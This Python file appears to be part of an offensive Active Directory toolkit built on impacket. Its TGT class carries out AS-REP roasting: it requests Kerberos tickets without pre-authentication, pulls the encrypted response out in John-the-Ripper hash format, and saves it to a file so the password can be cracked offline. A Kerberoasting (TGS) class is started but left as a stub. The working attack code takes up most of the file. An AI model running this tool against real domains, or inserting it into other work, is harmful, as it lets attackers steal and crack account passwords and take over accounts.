#!/usr/bin/env python
import random
import sys
from binascii import hexlify
import datetime
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, \
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.examples import logger
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter, TGS_REP
#from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection, SessionError
from impacket.krb5.ccache import CCache
import logging

import traceback
from binascii import unhexlify, hexlify
from impacket.ntlm import compute_lmhash, compute_nthash
import socket
try:
    import utils.kerb5getuserspnnopreauth as kerb5nopreauth
except ImportError:
    import kerb5getuserspnnopreauth as kerb5nopreauth
    
from kerb5getuserspnnopreauth import sendReceive, KerberosError, getKerberosTGS, getKerberosTGT
class TGT:
    def __init__(self, domain, username, dc, password='', nthash='', lmhash='', aeskey=''):
        self.username = username
        self.domain = domain
        self.password = password
        self.dc = dc
        self.nthash = nthash
        self.lmhash = lmhash
        self.aeskey = aeskey
        self.dc_ip = socket.gethostbyname(self.dc)




    def run(self, save=False):
        """setting save to True will save the tgt to the {username}.ccache"""
        
        clientName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.domain.upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = True
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.dc_ip)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.dc_ip)
            else:
                raise e

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            # raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % self.username)
            raise Exception
        results = '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]),
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]))

        results = results.replace("b'", '')
        results = results.replace("'", "")
        # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
        print(f'[+] {self.username} does not require preauth! saving to {self.username}.hash')
        name = f'{self.username}.hash'
        f = open(name, 'w')
        f.write(results)
        
        #print(results)
        return results




def getName(machine):
    """ gets the machine name with the kdc host or domain """
    s = SMBConnection(machine, machine)
    return s.getServerName()


class TGS:
    def __init__(self, domain, dc, password='', nthash='', lmhash='', aeskey='') -> None:
        self.domain = domain
        self.dc = dc
        self.password = password
        self.nthash = nthash
        self.lmhash = lmhash
        self.aeskey = aeskey
        self.dc_ip = socket.gethostbyname(self.dc)
    
    def get_TGT(self):
        pass